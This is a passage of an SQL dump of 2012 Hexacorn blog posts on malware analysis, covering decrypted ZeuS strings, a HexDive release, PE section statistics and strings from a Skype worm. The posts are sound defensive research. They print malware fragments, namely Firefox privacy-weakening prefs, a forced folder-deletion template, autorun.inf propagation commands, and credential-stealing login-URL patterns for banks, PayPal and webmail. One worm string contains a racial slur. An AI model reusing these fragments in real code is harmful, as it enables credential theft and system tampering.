configuration.”\n“Failed to execute command at line %u.”\n“Unknown command at line %u.”\n“OK.”\n“firefox.exe”\n“*Mozilla*”\n“iexplore.exe”\n“*Microsoft*”\n“chrome.exe”\n“*Google*”\n“Winsta0”\n“default”\n“dwm.exe”\n“taskhost.exe”\n“taskeng.exe”\n“wscntfy.exe”\n“ctfmon.exe”\n“rdpclip.exe”\n“explorer.exe”\n“V\\t%08X\\r\\nC\\t%08X\\r\\nPS\\t%08X”\n“BOT NOT CRYPTED!”\n“SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion”\n“InstallDate”\n“DigitalProductId”\n“%s_%08X%08X”\n“fatal_error”\n“unknown”\n“wtsapi32.dll”\n“WTSEnumerateSessionsW”\n“WTSFreeMemory”\n“WTSQueryUserToken”\n“userenv.dll”\n“GetDefaultUserProfileDirectoryW”\n“user32.dll”\n“MessageBoxW”\n“ntdll.dll”\n\nThe strings are decrypted in various places in a whole code by a procedure that takes 2 arguments: ID of the string + offset to a destination buffer. In case you are wondering how I decrypted all of them in one go, I did a quick and dirty patch to a call that calls a decryption routine. The patch is easy to write in OllyDbg and to preserve info on all decrypted strings, I put a conditional breakpoint without pausing with an option to log all decrypted strings to the Olly Log Window. I then run this piece of code incrementing ID in each iteration until I got an access violation: simple, but effective trick w/o writing dedicated decrypter (a.k.a. lazy reversing :)).\n\nThe original source code of ZeuS 2.0.8.9 version contains most of these encrypted strings in a source\\client\\cryptedstrings.txt file; a diff between the list pasted above and the list from the ZeuS 2.0.8.9 allows to generate a list of new strings  – indicative of a new functionality\n\nanti-vm\nmore info stealing capabilities\nmodification of firefox privacy settings\n\nThe new added strings are:\n\nModule: %u\\r\\nType: %s\\r\\nTitle: %s\\r\\nInfo: %s\\r\\n\nERROR\nFAILURE\nSUCCESS\nUNEXPECTED\nrurl\nsurl\nfurl\nmask\npost\nextensions\nrules\npatterns\n%tokenspy%\nurl\nbuid\nruid\npuid\nsession\ndata\nget_status\nstatus\nstatus_cache_time\nCan’t compile tokenspy rules.\nfileName=[%S], fileSize=[%u], fileCRC32=[0x%08X].\nset_url\ndata_before\\r\\n\ndata_inject\\r\\n\ndata_after\\r\\n\ndata_end\\r\\n\n%webinject%\nCan’t compile webinjects.\nfileName=[%S], fileSize=[%u], fileCRC32=[0x%08X], processedInjects=[%u].\nWebinjects has been compiled.\nresult=[%u], fileName=[%S], fileSize=[%u], fileCRC32=[0x%08X], processedInjects=[%u].\n*vmware*\n*sandbox*\n*virtualbox*\n*geswall*\n*bufferzone*\n*safespace*\n*.ru\n*.con.ua\n*.by\n*.kz\ncmd.exe\npowershell.exe\n\\r\\nexit\\r\\n\n\\r\\nprompt $Q$Q$Q$Q$Q$Q$Q$Q$Q$Q[ $P ]$G\\r\\n\n:d\\r\\nrd /S /Q \\”%s\\”\\r\\nrd /S /Q \\”%s\\”\\r\\nrd /S /Q \\”%s\\”\\r\\nif exist \\”%s\\” goto d\\r\\nif exist \\”%s\\” goto d\\r\\nif exist \\”%s\\” goto d\nvideos\\\\%S_%02u_%02u_%02u_(%02u-%02u).webm\nGrabbed data from: %s\\n\\n%S\n%s%s\\nUser-Agent: %S\\nCookie: %S\\nAccept-Language: %S\\nAccept-Encoding: %S\\nScreen(w:h): %u:%u\\nReferer: %S\\nUser input: %s\\n%sPOST data:\\n\\n%S\n” *BLOCKED*\nContent-Type: %s\\r\\n\nZCID: %S\\r\\n\napplication/x-www-form-urlencoded\nHTTP authentication: username=\\%s\\””, password=\\””%s\\””\\n”\nProfile%u\nuser_pref(\\”network.cookie.cookieBehavior\\”, 0);\\r\\nuser_pref(\\”privacy.clearOnShutdown.cookies\\”, false);\\r\\nuser_pref(\\”security.warn_viewing_mixed\\”, false);\\r\\nuser_pref(\\”security.warn_viewing_mixed.show_once\\”, false);\\r\\nuser_pref(\nuser_pref(\\”browser.startup.homepage\\”, \\”%s\\”);\\r\\nuser_pref(\\”browser.startup.page\\”, 1);\\r\\n\nMozila(Firefox) cookies:\\n\\n%S\nOutlook Express Recipients\n%s_Server\n%s_User_Name\n%s_Password2\n%s_Port\n%s_Secure_Connection\n\n \n \nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2012/10/26/zeus-trivia/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (335, 'Permanent Link to HexDive 0.6 – new strings and more -Context…', 'Hexacorn', 'October 18, 2012 ', 'Update\nI have received a question from Pedro about the APIs that are commonly used by keyloggers which I mentioned in a context of one of the screenshots; The APIs I had in mind were MonitorFromPoint and GetMonitorInfoA (used for taking screenshots on multiple monitors) and a few others that can be seen on both screenshot and inside the example_hdive_qC.txt file; this was an ambiguous statement for a few reasons (APIs can be part of a clean framework or unit/module, keylogger is not an infostealer, etc.), so I am clarifying it for the future reader;\nLast, but not least – obviously the only way to confirm that any APIs highlighted by HexDive are used for malicious purposes is by doing more in-depth analysis – the only thing HexDive does is identification of APIs and strings of interest for the malware analyst \nOld post\nNew version is 25% larger (what a bloatware! :)) as it brings in a huge number of new strings:\n\nPE Section names and other packer identifiers\nInstaller-related strings\nIdentifiers of script-to-exe type tools e.g. perl2exe, py2exe, exerb, winbatch\nLots of known CLSID strings\n\nIt slowly gets to the point where I wanted it to be when I started writing it. I also think I finally got it right on how to present the data extracted from a file in a way that:\n\nshows as many interesting strings as possible\nmakes it as readable as possible\nwith all that it still provides information about the string’s context\nallows to quickly find the string in a hex editor\nin a full-output mode allows for an easy parsing\navoid missing strings as much as possible\n\nSo, with all that said, the new contextual output is introduced in this version.\nIt works the same way as the old version -c, but it removes keywords and duplicated lines from output (not perfectly, but good enough). I must mention here that contextual output requires a wide screen (terminal at least 120 columns), but I hope if you do malware analysis you have this available   (feel free to let me know if you need a more narrower output, so I can accommodate that in a future version).\nThe new contextual output option is available as capitalized -c i.e. -C – You can run it in many ways, e.g.\nhdive -C\nhdive -aC\nhdive -afC\nSee example below and as usual, I would be grateful if you let me know if it works for you or if you spot issues.\nExample Session\n\nThis is a sample of a new malware, downloaded quite recently.\nRunning hdive on it first:\nhdive -C // note capital letter\n \n\nThe file is UPXd, and we can see some Borland strings (Boolean/False/True/Char/etc.).\nWe can unpack it using upx.exe\nupx -d test\\sample.exe -o test\\sample.exe.unpacked\n\n…and then run hdive again:\nhdive -qC test\\sample.exe.unpacked\nNow it looks much better and it’s definitely Borland.\nScrolling down we can see lots of juicy info – APIs that are commonly used by keyloggers,\n\nthen going further, we can see winsock functions and strings, as well as Delphi components (units) listed as well together with ‘username’, ‘password’:\nand finally lots of HTTP-related strings, as well as another unit-name from Borland:\n\nThere are more interesting strings there – you can see output of the command by viewing all the attached text files; read on.\nOut of curiosity, I compared the output of the following commands:\n\nstrings -q -n 6 // this is usually a good length allowing removing a lot of junk\nhdive -q\nhdive -qC\n\non the very same sample and then compared the file sizes and number of lines in each file.\nThese are the results:\ndir example_*\r\n2012-10-19  01:24            17,185 example_hdive_q.txt\r\n2012-10-19  01:24            61,364 example_hdive_qC.txt\r\n2012-10-19  01:24            58,199 example_strings_qn6.txt\r\nwc -l example*\r\n  1336 example_hdive_q.txt\r\n   529 example_hdive_qC.txt\r\n  3777 example_strings_qn6.tx\nIt would seem (and mind you, it is a very subjective statement :)) that hdive can be quite a time saver! Instead of reviewing over 3.5K, you end up doing 35% of it and immediately getting juicy keywords and their context (this can be of course still improved).\nYou can download the files here:\n\nhdive.exe or hdive.zip\n\n\nexamples:\n\n\n\nexample_hdive_q.txt\nexample_hdive_qC.txt\nexample_strings_qn6.txt\n\n\nEnjoy!\nShare this :)', 'HexDive, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/10/18/hexdive-0-6-new-strings-and-more-context/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (336, 'Permanent Link to HSD – Quick bug fix', 'Hexacorn', 'October 18, 2012 ', 'I have updated my Sniffer Detector fixing a bug related to output redirection – it basically didn’t work when you tried to run\nhsd > output\nThe new version fixes the problem.\nYou can download it here.\nThx to Sebastien for spotting it and letting me know.\nShare this :)', 'Compromise Detection, HSD, Software Releases', 'http://www.hexacorn.com/blog/2012/10/18/hsd-quick-bug-fix/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (337, 'Permanent Link to Random Stats from 1.2M samples – PE Section Names', 'Hexacorn', 'October 14, 2012 ', 'update3\nThere is a newer version of this list here\nupdate2\nupdated section list/fixed bugs – thanks to Nicolas Brulez and Tomislav Pericin (ap0x)\nupdate\nadded one more list – List of popular section names\nold post\nI continue to batch analyze my malware collection and the latest list I generated contains:\n\nThe most popular PE file section names\nThe packer/protector section names/keywords – I tried to build a separate list of known section names/keywords that belong to known packers/protectors\n\nYou can find the lists below – please let me know if you find any mistakes (especially in packer sections’ names/attribution); Thanks!\nThe most popular PE file section names (top 100)\n 658574 .rsrc   \r\n 590338 .text   \r\n 545976 .data   \r\n 442607 .rdata  \r\n 298316 .reloc  \r\n 194273         \r\n 178386 .idata  \r\n 111369 .tls    \r\n 109676 CODE    \r\n 105309 DATA    \r\n 100668 BSS     \r\n  40293 UPX0    \r\n  37838 UPX1    \r\n  35164 .adata  \r\n  35020 .bss    \r\n  31336 .edata  \r\n  28137 .ndata  \r\n  15890 .itext  \r\n  15451 .aspack\r\n  12818 INIT    \r\n   9665 UPX2    \r\n   9376 .Upack  \r\n   7727 PS      \r\n   6786 .CRT    \r\n   6628 .vmp0   \r\n   6602 .nsp1   \r\n   6590 .nsp0   \r\n   6560 .code   \r\n   6542 .sdata  \r\n   6423 .nsp2   \r\n   6270 .pdata  \r\n   5710 tldksods\r\n   5462 .       \r\n   5395 Themida\r\n   4313 .vmp1   \r\n   4054 .MaskPE\r\n   3926 PAGE    \r\n   3721 .text-co\r\n   3721 .data-co\r\n   3314 rdata   \r\n   3249 BitArts\r\n   3035 .didata\r\n   2886 idata   \r\n   2881 .packed\r\n   2803   @   @\r\n   2707 .textbss\r\n   2299 .text1  \r\n   2257 .data1  \r\n   2150 .petite\r\n   2079 .texc   \r\n   1926 Shared  \r\n   1793 pebundle\r\n   1714   u     \r\n   1557 MEW F   \r\n   1536 .UPX0   \r\n   1513     t   \r\n   1450 .data2  \r\n   1434 text    \r\n   1346 .RLPack\r\n   1331 .vmp2   \r\n   1300 .ex_cod\r\n   1286 sdt     \r\n   1280 mdata   \r\n   1267 cdata   \r\n   1263 sdata   \r\n   1240 .pklstb\r\n   1238 .MPRESS1\r\n   1235 .MPRESS2\r\n   1204 .UPX1   \r\n   1201 .rdata p\r\n   1191 .brdata\r\n   1183 .udata  \r\n   1131 .crt    \r\n   1114 .sxdata\r\n   1091 htomaota\r\n   1083 .perplex\r\n   1076 PAGEWMI\r\n   1057 edata   \r\n   1044 .delete\r\n   1038 .relo2  \r\n   1031 pec1    \r\n   1015 .mackt  \r\n   1009 PAGEDRV\r\n    981 .svkp   \r\n    980 .avp    \r\n    969 .ByDwing\r\n    967 .DATA   \r\n    963 .debug  \r\n    943 0 ext   \r\n    899 .xdata  \r\n    876 .ccg    \r\n    865 .data ri\r\n    857 .wqvwbj\r\n    857 .kewyo  \r\n    857 .axlgt  \r\n    852 .spack  \r\n    849     ta  \r\n    839 .exc    \r\n    824 .avc    \r\n    807 PAGESYS\nThe packer/protector section names/keywords\n\n.aspack – Aspack packer\n.adata – Aspack packer/Armadillo packer\nASPack – Aspack packer\n.ASPack – ASPAck Protector\n.ccg – CCG Packer (Chinese Packer)\nBitArts – Crunch 2.0 Packer\nDAStub – DAStub Dragon Armor protector\n!EPack – Epack packer\nFSG! – FSG packer (not a section name, but a good identifier)\nkkrunchy – kkrunchy Packer\n.mackt – ImpRec-created section\n.MaskPE – MaskPE Packer\nMEW – MEW packer\n.MPRESS1 – Mpress Packer\n.MPRESS2 – Mpress Packer\n.neolite – Neolite Packer\n.neolit – Neolite Packer\n.nsp1 – NsPack packer\n.nsp0 – NsPack packer\n.nsp2 – NsPack packer\nnsp1 – NsPack packer\nnsp0 – NsPack packer\nnsp2 – NsPack packer\n.packed – – RLPack Packer (first section)\npebundle – PEBundle Packer\nPEBundle – PEBundle Packer\nPEC2TO – PECompact packer\nPECompact2 – PECompact packer (not a section name, but a good identifier)\nPEC2 – PECompact packer\npec1 – PECompact packer\npec2 – PECompact packer\nPEC2MO – PECompact packer\nPELOCKnt – PELock Protector\n.perplex – Perplex PE-Protector\nPESHiELD – PEShield Packer\n.petite – Petite Packer\nProCrypt – ProCrypt Packer\n.RLPack – RLPack Packer (second section)\nRCryptor – RPCrypt Packer\n.RPCrypt – RPCrypt Packer\n.sforce3 – StarForce Protection\n.spack – Simple Pack (by bagie)\n.svkp – SVKP packer\nThemida – Themida Packer\n.Themida – Themida Packer\n.packed – Unknown Packer\n.Upack – Upack packer\n.ByDwing – Upack Packer\nUPX0 – UPX packer\nUPX1 – UPX packer\nUPX2 – UPX packer\nUPX! – UPX packer\n.UPX0 – UPX Packer\n.UPX1 – UPX Packer\n.UPX2 – UPX Packer\n.vmp0 – VMProtect packer\n.vmp1 – VMProtect packer\n.vmp2 – VMProtect packer\nVProtect – Vprotect Packer\nWinLicen – WinLicense (Themida) Protector\n.WWPACK – WWPACK Packer\n.yP – Y0da Protector\n.y0da – Y0da Protector\n\nList of popular section names\n\n.arch – Alpha-architecture section\n.bss – Uninitialized Data Section\n.BSS – Uninitialized Data Section\n.code – Code Section\n.cormeta – CLR Metadata Section\n.CRT – Initialized Data Section  (C RunTime)\n.data – Data Section\n.DATA – Data Section\n.data1 – Data Section\n.debug – Debug info Section\n.debug$F – Debug info Section\n.debug$P – Debug info Section\n.debug$S – Debug info Section\n.debug$T – Debug info Section\n.didata – Delay Import Section\n.edata – Export Data Section\n.fasm – FASM flat Section\n.flat – FASM flat Section\n.idata – Initialized Data Section  (Borland)\n.idlsym – IDL Attributes\n.itext – Code Section  (Borland)\n.ndata – Nullsoft Installer section\n.pdata – Exception Handling Functions Section (PDATA records)\n.rdata – Read-only Data Section  (Borland)\n.reloc – Relocations Section\n.rodata – Read-only Data Section\n.rsrc – Resource section\n.sbss – GP-relative Uninitialized Data Section\n.sdata – GP-relative Initialized Data Section\n.srdata – GP-relative Read-only Data Section\n.sxdata – Registered Exception Handlers Section\n.text – Code Section\n.text1 – Code Section\n.textbss – Section used by incremental linking\n.tls – Thread Local Storage Section\n.tls$ – Thread Local Storage Section\n.udata – Uninitialized Data Section\n.vsdata – GP-relative Initialized Data\n.xdata – Exception Information Section\nBSS – Uninitialized Data Section  (Borland)\nCODE – Code Section (Borland)\nDATA – Data Section (Borland)\nedata – Export Data Section\nidata – Initialized Data Section  (C RunTime)\nINIT – INIT section (drivers)\nPAGE – PAGE section (drivers)\nrdata – Read-only Data Section\nsdata – Initialized Data Section\n\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/10/14/random-stats-from-1-2m-samples-pe-section-names/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (338, 'Permanent Link to Skype worm – strings & some metadata', 'Hexacorn', 'October 9, 2012 ', 'Update\nA few guys asked what are the hashes associated with the samples; here they are:\nc483bffc879233d99ba52f05fd100872    skype_02102012_images.exe\r\n393b4c117e15fbcfe56f560a8e6a3f0c    skype_04102012_image.exe\r\n98f74b530d4ebf6850c4bc193c558a98    skype_05102012_image.exe\r\ne8e2ba08f9aff27eed45daa8dbde6159    skype_06102012_image.exe\r\ne3af8159d2f1af293bb43cd41d4171db    skype_08102012_image.exe\nI just had a very quickly look at the code today and interestingly, there are some ‘funny’ snippets e.g.\n\ndirectly reading value at @7FFE002Ch _KUSER_SHARED_DATA.ImageNumberLow and if not equal to IMAGE_FILE_MACHINE_I386 is launching Internet Explorer – its PID is later used by some extra thread which I have not explored yet\na dead code attempting to wipe out the PhysicalDrive0\nchecking if the host’s drive is USB via  DeviceIoControl (…(IOCTL_STORAGE_QUERY_PROPERTY…)\ncode removing ADS :Zone.Identifier\nseems to be also hooking a few APIs, but need to check that as well\n\nOlder post\nInfo on skype worm does the rounds, so I had a quick look and dumped the strings from the process inject – some are quite interesting and indicative of the functionality described in various blogs. Don’t have time to look at the code today, but it does look interesting enough to come back to it.\nInterestingly, while timestamps indicate compilation timestamps from 2012\n2012-10-02 19:36:26     .\\skype_02102012_images.exe\r\n2012-10-04 15:03:38     .\\skype_04102012_image.exe\r\n2012-10-06 06:24:55     .\\skype_05102012_image.exe\r\n2012-10-07 01:15:19     .\\skype_06102012_image.exe\r\n2012-10-08 12:09:07     .\\skype_08102012_image.exe\nThe compilation time of one of the injects is 2011-05-16 21:46:39, so it seems to be quite an old code.\n%s.%s\npdef\n%s.%S\nbrk\ndll\nexe\nDBWIN\n\\\\.\\pipe\n%s.Protect “%s” against file removal done!!\n%s.Protect “%S” against removal of our pc!!\nblock\nbdns\nkernel32.dll\nCreateFileW\n0123456789ABCDEF\ni.root-servers.org\n%s.Stopped “%s” against removal of file!\n%s.Stopped “%S” against moving the file!\n%s.MSN-> Done, MSG is sent\n%s.MSN-> Succesfully sent to %s!\n%s.MSN-> Message Pwned :)!\nmsnmsg\nmsnint\nbaddr\nX-MMS-IM-Format:\nCAL %d %256s\nmsnu\nDone frst\nssssssssssssss: %d\nssssssssss: %d\nNtFreeVirtualMemory\nNtAllocateVirtualMemory\nNtQuerySystemInformation\nLdrEnumerateLoadedModules\nNtQueryInformationProcess\nLdrGetProcedureAddress\nNtQueryVirtualMemory\nLdrLoadDll\nNtQueryInformationThread\nLdrGetDllHandle\nRtlAnsiStringToUnicodeString\nntdll.dll\n\\\\.\\pipe\\%s\nkernel32.dll\nGetNativeSystemInfo\n%s_%d\n%s_0\n%s-Mutex\nSeDebugPrivilege\nntdll.dll\nNtGetNextProcess\n%s-pid\n%s-comm\nNtResumeThread\nInternet Explorer\\iexplore.exe\nPONG\nJOIN #\nPRIVMSG #\n%s.Stopped “%S” against makin “%S”\n%s.Stopped “%S” against makin “%S” – “%s” file deleted successfully!\n.exe\nautorun.inf\n%s.Identified Proc- “%S” sending a suspicious message to %s:%d.\n%s.Identified Proc- “%S” as malicious upon checking port %s:%d {Nigger: %s}.\nPRIVMSG %255s\nJOIN %255s\nPRIVMSG\nJOIN\ncnc\n%s:%d\npidgin.exe\nwlcomm.exe\nmsnmsgr.exe\nmsmsgs.exe\nflock.exe\nopera.exe\nchrome.exe\nieuser.exe\niexplore.exe\nfirefox.exe\nNtSetInformationProcess\n%s.%s%s\n%S%s%s\nHKCU\\\nHKLM\\\n%s.%S%S\n%S%S%S\nHKCU\\\nHKLM\\\nmsn\n%s_\naaaaa_%s\noff\n%s.%s (p=’%S’)\npop3://%s:%s@%s:%d\npopgrab\n%s:%s@%s:%d\nanonymous\nftp://%s:%s@%s:%d\nftpgrab\n%s.%s ->> %s (%s : %s)\n%s.%s ->> %s : %s\nasdadasdsss\nasds\nsss\nssssss\nssss\n%s-%s-%s\ndasdsd\nasdsds\nMicrosoft Unified Security Protocol Provider\n%s.ewfewewrtwertwerterfegergwregwergwergretretwerfrr ‘%s’\nscr\npif\ncom\n%s.eufhquwefh9wef89qwey8fhqwehf89hqwe89fh8w9ehf89h8e ‘%S’\ndddddsds\nasdasdsds\n234534543324534545445\n23423415644556\n894848\n89234543464554544\n345487544\n8944451\n843456544\n298548344565454458449\n8344584458495\n345234545\n8344584544\n2854844\n81254848484450\nsdfdfcs\nasdsdsasffsds\nssdasccxzxccefrg\nerffssd\neeefiyu\netwegfg\nerttergh\nertrtgb\nertgfd\nerttrf\nrrrr\ndfhtrstgthgh\nrthfg\nertrtfdgfg\ncvbhrthgfgh\ndfbbghth\nthtrhhgf\ndfgdgggbvf\ndfgerhrthth\nrthhth\ndfgrthrtggfgv\nrthrtgtrhthrt\ndgrthgfhhhg\nipconfig.exe\nverclsid.exe\nregedit.exe\nrundll32.exe\ncmd.exe\nregsvr32.exe\nlogin[password]\nlogin[username]\n*members*.iknowthatgirl*/members*\nIKnowThatGirl\n*youporn.*/login*\nYouPorn\n*members.brazzers.com*\nBrazzers\nclave\nnumeroTarjeta\n*clave=*\n*bcointernacional*login*\nBcointernacional\n*:2222/CMD_LOGIN*\n*whcms*dologin*\n*:2086/login*\n*:2083/login*\n*:2082/login*\n*webnames.ru/*user_login*\nWebnames\n*dotster.com/*login*\nDotster\nloginid\n*enom.com/login*\nEnom\nlogin.Pass\nlogin.User\n*login.Pass=*\n*1and1.com/xml/config*\n1and1\ntoken\n*moniker.com/*Login*\nMoniker\nLoginPassword\nLoginUserName\n*LoginPassword=*\n*namecheap.com/*login*\nNamecheap\nloginname\n*godaddy.com/login*\nGodaddy\nPassword\nEmailName\n*Password=*\n*alertpay.com/login*\nAlertpay\n*netflix.com/*ogin*\nNetflix\n*thepiratebay.org/login*\nThepiratebay\n*torrentleech.org/*login*\nTorrentleech\n*vip-file.com/*/signin-do*\nVip-file\npas\nlog\n*pas=*\n*sms4file.com/*/signin-do*\nSms4file\n*letitbit.net*\nLetitbit\n*what.cd/login*\nWhatcd\n*oron.com/login*\nOron\n*filesonic.com/*login*\nFilesonic\n*speedyshare.com/login*\nSpeedyshare\n*pw=*\n*uploaded.to/*login*\nUploaded\n*uploading.com/*login*\nUploading\nloginUserPassword\nloginUserName\n*loginUserPassword=*\n*fileserv.com/login*\nFileserve\n*hotfile.com/login*\nHotfile\n*4shared.com/login*\n4shared\ntxtpass\ntxtuser\n*txtpass=*\n*netload.in/index*\nNetload\n*freakshare.com/login*\nFreakshare\nlogin_pass\n*login_pass=*\n*mediafire.com/*login*\nMediafire\n*sendspace.com/login*\nSendspace\n*megaupload.*/*login*\nMegaupload\n*depositfiles.*/*/login*\nDepositfiles\nuserid\n*signin.ebay*SignIn\neBay\nrut\n*officebanking.cl/*login.asp*\nOfficeBanking\n*secure.logmein.*/*logincheck*\nLogMeIn\nsession[password]\nsession[username_or_email]\n*password]=*\n*twitter.com/sessions\nTwitter\ntxtPassword\ntxtEmail\n*&txtPassword=*\n*.moneybookers.*/*login.pl\nMoneybookers\n*runescape*/*weblogin*\nRunescape\n*dyndns*/account*\nDynDNS\n*&password=*\n*no-ip*/login*\nNoIP\n*steampowered*/login*\nSteam\nquick_password\nquick_username\nusername\n*hackforums.*/member.php\nHackforums\nemail\n*facebook.*/login.php*\nFacebook\n*login.yahoo.*/*login*\nYahoo\npasswd\nlogin\n*passwd=*\n*login.live.*/*post.srf*\nLive\nTextfieldPassword\nTextfieldEmail\n*TextfieldPassword=*\n*gmx.*/*FormLogin*\nGMX\n*Passwd=*\nGmail\nFLN-Password\nFLN-UserName\n*FLN-Password=*\n*fastmail.*/mail/*\nFastmail\npass\nuser\n*pass=*\n*bigstring.*/*index.php*\nBigString\nscreenname\n*screenname.aol.*/login.psp*\npassword\nloginId\n*password=*\n*aol.*/*login.psp*\nAOL\nPasswd\nEmail\n*service=youtube*\n*google.*/*ServiceLoginAuth*\nYouTube\nlogin_password\nlogin_email\n*login_password=*\n*paypal.*/webscr?cmd=_login-submit*\nPayPal\n%s / ?%d HTTP/1.1\nHost: %s\nUser-Agent: %s\nKeep-Alive: 300\nConnection: keep-alive\nContent-Length: 42\nGET\nPOST\nMozilla/4.0\nConnection: Close\nX-a: b\n\\\\.\\PHYSICALDRIVE0\n00100\n%d.\nSeShutdownPrivilege\nNtShutdownSystem\nuwifhuewgfhkjhsduyrhdhd\neiueriufjeidj\nweiouriweojrioejeicn\neriuioiuerhoiohwefhjidj\newoueiuroyihehdkjjfbcn\nSystem Issue\nshell32.dll\n“%s” %S\nmsg\nhttp\nint\nhttpi\nusbi\ndnsapi.dll\nDnsFlushResolverCache\nPOST\nhttp://%s/%s\nhttp://%s/\nHTTP\nHost:\nPOST /%1023s\n.exe\nlol\nlol.exe\n{%s|%s%s}%s\nn%s{%s|%s%s}%s\n<br>\nERR\n2K8\nVIS\n2K3\nadmin\nisadmin\n127.0.0.1\n%s|%s|%s\nDnS Redir3cted!!!! “%s” to “%s”\ndisabled\nenabled\n%s|%s\n[Logins]: Cleared %d logins\n#user\n#admin\n#new\nremoving\nexiting\nreconnecting\n332\n433\n001\n376\nMOTD\nbsod\ndisable\nPOP3 ->\nFTP ->\n[d=”%s” s=”%d bytes”] Problem Found!: Check ur MD5 (%s != %s)\ndlds\nhttp://\nR3b00tinG\n[Login]: %s\n[DNS]: Blocked %d domain(s) – Redirected %d domain(s)\nasdasdweifuhwuiefggweihwuerhiiuhwerhueb\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\n%s:Zone.Identifier\nlolsup\nrunning\nIPC_Check\nwininet.dll\nsecur32.dll\nws2_32.dll\nshell\\open\\command=\nshell\\explore\\command=\nicon=shell32.dll,7\nuseautoplay=1\naction=Open folder to view files\nshellexecute=\n[autorun]\n.lnk\n%windir%\\system32\\cmd.exe\n&&%%windir%%\\explorer.exe %%cd%%%s\n/c “start %%cd%%RECYCLER\\%s\nRECYCLER\n.inf\n%s%s\n\\\\.\\%c:\n%S%S\\Desktop.ini\n%s\\%s\n%sautorun.tmp\n%sautorun.inf\n%c:\\\ngdkWindowToplevelClass\n%0x.exe\ncomment-text\n*bebo.*/c/home/ajax_post_lifestream_comment\nbebo Lifestream\n*bebo.*/c/profile/comment_post.json\nbebo Comment\nMessage\n*bebo.*/mail/MailCompose.jsp*\nbebo Message\n*friendster.*/sendmessage.php*\nFriendster Message\ncomment\nFriendster Comment\nshoutout\n*friendster.*/rpc.php\nFriendster Shoutout\n*vkontakte.ru/mail.php\nvkontakte Message\n*vkontakte.ru/wall.php\nvkontakte Wall\nmessage\n*vkontakte.ru/api.php\nvkontakte Chat\ntext\n*twitter.*/*direct_messages/new*\nTwitter Message\n*twitter.*/*status*/update*\nTwitter Tweet\nstatus\n*facebook.*/ajax/*MessageComposerEndpoint.php*\nFacebook Message\nmsg_text\n*facebook.*/ajax/chat/send.php*\nFacebook IM\n-_.!~*\'()\nContent-Length:\n%s.%s hijacked!\n%s=\nMSG %d %s %d\nMSG %d %1s\nSDG %d %d\nReliability:\nFrom:\nContent-Length: %d\nX-MMS-IM-Format:\nSDG %d\nbmsn\n%s_0x%08X\nwinlogon.exe\nexplorer.exe\nRegCreateKeyExW\nRegCreateKeyExA\nadvapi32.dll\nURLDownloadToFileW\nURLDownloadToFileA\nurlmon.dll\nPR_Write\nnspr4.dll\nDnsQuery_W\nDnsQuery_A\ndnsapi.dll\nInternetWriteFile\nHttpSendRequestW\nHttpSendRequestA\nGetAddrInfoW\nsend\nCreateFileA\nMoveFileW\nMoveFileA\nDeleteFileW\nDeleteFileA\nkernel23.dll\nCopyFileW\nCopyFileA\nNtQueryDirectoryFile\nNtEnumerateValueKey\n%s\\%s.exe\n%08x\nOPEN\nlsass.exe\nFt7\nDnsFree\nDnsQuery_A\nDNSAPI.dll\nFreeContextBuffer\nInitializeSecurityContextW\nFreeCredentialsHandle\nDeleteSecurityContext\nQueryContextAttributesW\nAcquireCredentialsHandleW\nEncryptMessage\nDecryptMessage\nInitializeSecurityContextA\nApplyControlToken\nSecur32.dll\nSHGetSpecialFolderPathW\nSHGetFileInfoA\nShellExecuteA\nSHELL32.dll\nInternetCloseHandle\nInternetReadFile\nInternetQueryDataAvailable\nHttpQueryInfoA\nInternetOpenUrlA\nInternetOpenA\nHttpQueryInfoW\nInternetQueryOptionW\nWININET.dll\nPathAppendW\nStrStrIA\nPathAppendA\nPathFindExtensionA\nSHLWAPI.dll\nWS2_32.dll\nmemset\nwcsstr\nstrstr\nwcsrchr\n??3@YAXPAX@Z\natoi\nsscanf\n_strcmpi\nprintf\n_snprintf\nsprintf\nstrncpy\n_memicmp\n_wcsnicmp\n_vsnprintf\n_stricmp\nstrtok\nstrchr\n_snwprintf\n??2@YAPAXI@Z\n_strnicmp\nisxdigit\nmemmove\nstrncmp\ntoupper\nstrrchr\nvsprintf\nisalnum\nstrncat\nMSVCRT.dll\nlstrcpyA\nMoveFileExA\nlstrcmpA\nWideCharToMultiByte\nMoveFileExW\nlstrcmpW\nExitThread\nMultiByteToWideChar\nGetFileAttributesA\nSetFileAttributesW\nGetFileAttributesW\nLoadLibraryW\nCloseHandle\nSetFileTime\nCreateFileW\nGetFileTime\nGetSystemTimeAsFileTime\nWriteFile\nGetModuleHandleW\nGetLastError\nReadFile\nGetTickCount\nHeapAlloc\nGetProcessHeap\nHeapFree\nlstrlenA\nSleep\nWriteProcessMemory\nReadProcessMemory\nInitializeCriticalSection\nLeaveCriticalSection\nEnterCriticalSection\nHeapReAlloc\nSetEvent\nConnectNamedPipe\nCreateNamedPipeA\nCreateEventA\nDisconnectNamedPipe\nGetOverlappedResult\nWaitForMultipleObjects\nCreateFileA\nVirtualFreeEx\nVirtualAllocEx\nIsWow64Process\nCreateRemoteThread\nOpenProcess\nWaitForSingleObject\nReleaseMutex\nMapViewOfFile\nOpenFileMappingA\nCreateFileMappingA\nInterlockedIncrement\nUnmapViewOfFile\nCreateMutexA\nGetVersionExA\nGetModuleFileNameW\nInterlockedCompareExchange\nCreateThread\nGetWindowsDirectoryW\nDeleteFileW\nGetTempFileNameW\nlstrcatW\nlstrcpynW\nDeleteFileA\nSetFileAttributesA\nlstrcpyW\nLocalFree\nLocalAlloc\nlstrcpynA\nSetFilePointer\nDeviceIoControl\nVirtualAlloc\nCreateProcessW\nExitProcess\nlstrcatA\nGetVolumeInformationW\nGetLocaleInfoA\nFlushFileBuffers\nCopyFileW\nFindClose\nFindNextFileA\nFindFirstFileA\nSetCurrentDirectoryA\nLockFile\nGetFileSize\nCreateDirectoryA\nGetLogicalDriveStringsA\nOpenMutexA\nGetModuleFileNameA\nGetWindowsDirectoryA\